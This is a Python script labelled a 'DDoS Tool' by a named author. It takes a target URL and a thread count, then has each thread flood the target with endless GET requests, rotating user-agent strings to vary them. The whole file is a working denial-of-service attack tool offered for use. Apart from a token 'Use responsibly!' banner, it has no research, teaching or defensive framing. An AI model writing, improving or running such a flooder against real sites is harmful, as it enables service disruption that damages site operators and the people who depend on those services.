from termcolor import colored
import requests
import threading
import time
import random
import sys

def print_banner():
    print(colored("=====================================", 'cyan'))
    print(colored("[×] DDoS Tool by 𝘾𝙞𝙥𝙝𝙚𝙧 𝙎𝙦𝙪𝙞𝙙 ", 'red'))
    print(colored("[×] Use responsibly!", 'yellow'))
    print(colored("=====================================", 'cyan'))

def generate_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ]
    return random.choice(agents)

def attack(url, thread_id):
    while True:
        try:
            headers = {'User-Agent': generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=5)
            print(colored(f"[+] Thread {thread_id} - Status: {response.status_code} --------+", 'green'))
        except:
            print(colored(f"[-] Thread {thread_id} - Failed --------+", 'red'))
        time.sleep(random.uniform(0.1, 0.5))

def main():
    print_banner()
    url = input(colored("[*] Enter target URL (http:// or https://): ", 'blue'))
    if not url.startswith(('http://', 'https://')):
        print(colored("[!] Invalid URL! Must start with http:// or https://", 'red'))
        sys.exit(1)
    
    try:
        threads_count = int(input(colored("[*] Enter number of threads (10-100): ", 'blue')))
        if threads_count < 10 or threads_count > 100:
            print(colored("[!] Threads must be between 10 and 100", 'red'))
            sys.exit(1)
    except ValueError:
        print(colored("[!] Invalid input! Enter a number", 'red'))
        sys.exit(1)

    print(colored(f"[*] Starting attack on {url} with {threads_count} threads...", 'yellow'))
    print(colored("=====================================", 'cyan'))

    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=attack, args=(url, i+1))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Attack stopped by user --------+", 'red'))
        sys.exit(0)
